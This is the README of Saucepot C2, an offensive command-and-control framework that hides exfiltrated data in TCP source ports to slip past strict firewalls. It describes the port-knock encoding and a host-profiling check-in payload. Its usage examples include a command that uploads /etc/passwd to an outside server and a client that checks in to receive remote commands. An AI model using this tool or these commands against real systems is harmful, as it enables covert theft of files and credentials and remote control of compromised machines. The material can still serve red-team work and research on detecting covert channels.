# Saucepot C2

Saucepot C2 is a client and server framework that leverages ephemeral TCP source ports for conducting data
exfiltration and command-and-control (C2).  The tool elevates the Port Knocking technique to a new level. Instead of using DstPorts as knock sequences, it employs SrcPorts or ephemeral ports. This approach allows data exfiltration even in highly strict firewall environments where only one outbound port is permitted, such as port 443. Since our payload resides in the SrcPort field, the TCP session state becomes irrelevant. We will exclusively use SYN packets for outbound data transfer to the server. Control and Data channels are segregated using two non-overlapping SrcPort ranges: 29000-33000 for Control and 49000-64360 for Data. The actual data can be reconstructed on the server side using the formula: **data = (SrcPort - 49000) % 256** after receiving the `session-start` sequence.

Currently, two port-knock sequences have been defined: `session-start` (sequences: 32400, 32500, 32600) and `session-end` (sequences: 29900, 29800, 29700). The compressed JSON data structure is sent after the `session-start` sequence, and the `session-end` sequence is sent after transmitting the data payload. Depending on different C2 commands, the structure of the data JSON varies. For example, for beacon check-in:

```
data = {
    'cmd': 'chkin',
    'payload': {
        'Hostname': hostname,
        'Username': os.getlogin(),
        'IP': ip,
        'OS': get_os(),
        'UUID': hostuuid
    }
}
```

Supported commands or features include:

- Check-in / heartbeat
- Directory listing
- Process listing
- File upload

This tool will not work in an environment where a client's source ports are mapped to different values after being NAT'd.

## Usage


### Server
```
usage: saucepot-server.py [-h] [-d <destination_host>] [-p <destination_port>] [-v] [-c]

options:
  -h, --help            show this help message and exit
  -d <destination_host>, --dst <destination_host>
                        Destination host used in packet filter (default: 127.0.0.1)
  -p <destination_port>, --port <destination_port>
                        Destination port used in packet filter (default: 80)
  -v, --verbose         Increase verbosity level (use multiple times for more verbosity)
  -c, --check           Check if the server sees the ephemeral port specified by the client
  ```

### Client
```
usage: saucepot-client.py [-h] [-d <destination_host>] [-p <destination_port>] [-c] [-u] [-f <file>]

options:
  -h, --help            show this help message and exit
  -d <destination_host>, --dst <destination_host>
                        Destination server to connect to (default: 127.0.0.1)
  -p <destination_port>, --port <destination_port>
                        Destination port to connect to (default: 80)
  -c, --check           Check if the server sees the ephemeral port specified by the client
  -u <file>, --upload <file>
                        Upload the file specified directly, without retrieving C2 commands
```

## Example Usage

Here are some examples of how to use Saucepot Server:

### Port checker
Check if specified source ports are kept after being NAT'd.

```shell
# Server
$ sudo python3 saucepot-server.py -d 172.31.48.68 -p 80 --check
Ephemeral Port Checker listening on port 80 ...

[2023-10-02 07:01:46] Challenge duel_1696402906.356157 received from 35.87.191.76:61896
[2023-10-02 07:01:46] Challenge duel_1696402906.367766 received from 35.87.191.76:54438
[2023-10-02 07:01:46] Challenge duel_1696402906.3793 received from 35.87.191.76:53003

# Client
$ python3 saucepot-client.py -d 18.246.19.238 -p 80 --check
Testing ephemeral port with 18.246.19.238:80 ...
Test 1 with ephemeral port 61896: PASS
Test 2 with ephemeral port 54438: PASS
Test 3 with ephemeral port 53003: PASS

Ephemeral port test succeeded. Enjoy Port Knocking 2.0 technique!
```


### File Exfiltration

Client uploads a file to the Server without receiving C2 commands from the Server.

```shell
# Server
$ sudo python3 saucepot-server.py -d 172.31.48.68 -p 80 

# Client
$ python3 saucepot-client.py -d 18.246.19.238 -p 80 --upload /etc/passwd
```

### Command and Control (C2)

Client checks in and starts receiving C2 commands to execute.

```shell
# Server
$ sudo python3 saucepot-server.py -d 172.31.48.68 -p 80 

# Client
$ python3 saucepot-client.py -d 18.246.19.238 -p 80
```

## Future Work

- More flexibility in `ls`, `upload` commands


## License

This project is licensed under the BSD-3-Clause License. See the [LICENSE](LICENSE) file for details.
